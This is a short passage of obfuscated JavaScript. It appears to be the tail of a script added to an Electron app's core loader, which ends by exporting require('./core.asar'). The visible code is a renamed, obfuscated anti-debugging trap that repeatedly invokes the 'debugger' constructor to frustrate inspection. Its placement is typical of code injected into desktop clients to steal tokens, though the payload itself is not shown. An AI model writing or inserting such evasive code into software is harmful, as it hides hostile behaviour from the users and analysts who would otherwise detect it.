            .constructor('debugger')
            .apply('stateObject')
    }
    fREeMAnBb(++kscHIShEre)
  }
  try {
    if (hELlODiAlz) {
      return fREeMAnBb
    } else {
      fREeMAnBb(0)
    }
  } catch (helLODiAlz) {}
}
module.exports = require('./core.asar')
